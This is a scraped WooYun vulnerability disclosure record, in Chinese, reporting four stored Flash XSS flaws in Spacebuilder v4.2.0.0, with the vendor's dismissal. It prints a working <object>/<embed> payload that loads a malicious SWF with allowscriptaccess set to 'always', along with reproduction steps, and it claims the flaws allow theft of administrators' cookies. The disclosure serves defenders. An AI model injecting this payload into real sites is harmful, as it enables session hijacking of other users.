{"id": 42614, "wybug_id": "wooyun-2014-085184", "wybug_title": "Spacebuilder存储型跨站漏洞打包", "wybug_corp": "Spacebuilder", "wybug_author": "路人甲", "wybug_date": "2014-12-04 15:34", "wybug_open_date": "2015-01-10 15:36", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "13", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-04：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-12-09：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-02-02：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-02-12：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-02-22：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-01-10：\t细节向公众公开  简要描述： Spacebuilder存在多个存储型Flash跨站，可盗取任意用户cookie信息(包括管理员)，或进行其它攻击。 详细说明：  涉及版本：Spacebuilderv4.2.0.0Spacebuilder存在多处存储型Flash跨站，由于Flash文件可以执行任意javascript脚本，利用此漏洞我们可以盗取任意用户(包括管理员)的cookie信息，或进行其它恶意操作。   漏洞证明：  漏洞一、撰写日志模块Flash跨站。1、登录系统，撰写日志，拦截请求，在日志内容中加入以下代码的URL编码形式：<object width=\"0%\" height=\"0%\" title=\"flash\" data=\"http://127.0.0.1/xss.swf\" type=\"application/x-shockwave-flash\">\t<param name=\"quality\" value=\"high\"/>\t<param name=\"allowscriptaccess\" value=\"always\"/>    <embed width=\"0%\" height=\"0%\" quality=\"high\" pluginspage=\"http://www.macromedia.com/go/getflashplayer\" src=\"http://127.0.0.1/xss.swf\" type=\"application/x-shockwave-flash\" allowscriptaccess=\"always\"/>    </embed></object>\n\n2、其它用户(或管理员)浏览日志时，漏洞触发：\n\n3、使用Firebug查看页面源代码：\n\n系统没有对<object>标签的allowscriptaccess属性进行过滤，修改flash文件中的恶意代码可以进行针对性的攻击。漏洞二、资讯模块Flash存储型跨站1、登录系统，在资讯模块进行投稿，使用代理拦截请求，在内容中插入同漏洞一一样的恶意代码：\n\n2、其它用户(包括管理员)查看资讯内容时，漏洞触发：\n\n3、使用Firebug查看页面源代码：\n\n系统没有对<object>标签的allowscriptaccess属性进行过滤，修改flash文件中的恶意代码可以进行针对性的攻击漏洞三、百科模块存储型Flash跨站。1、登录系统，在百科模块创建词条，拦截请求，在词条内容中添加同漏洞一一样的恶意代码：\n\n2、其它用户(包括管理员)查看词条内容时，漏洞触发：\n\n3、使用Firebug查看页面源代码：\n\n系统没有对<object>标签的allowscriptaccess属性进行过滤，修改flash文件中的恶意代码可以进行针对性的攻击漏洞四、问答模块存储型Flash跨站1、登录系统，在问答模块提问问题，拦截请求，在提问问题的补充说明中，插入同漏洞一一样的恶意代码。\n\n2、其它用户（或管理员）查看提问的问题时，漏洞触发：\n\n3、使用Firebug查看源代码：\n\n系统没有对<object>标签的allowscriptaccess属性进行过滤，修改flash文件中的恶意代码可以进行针对性的攻击   修复方案：  对<object>标签的allowscriptaccess属性进行过滤。   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-01-10 15:36 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}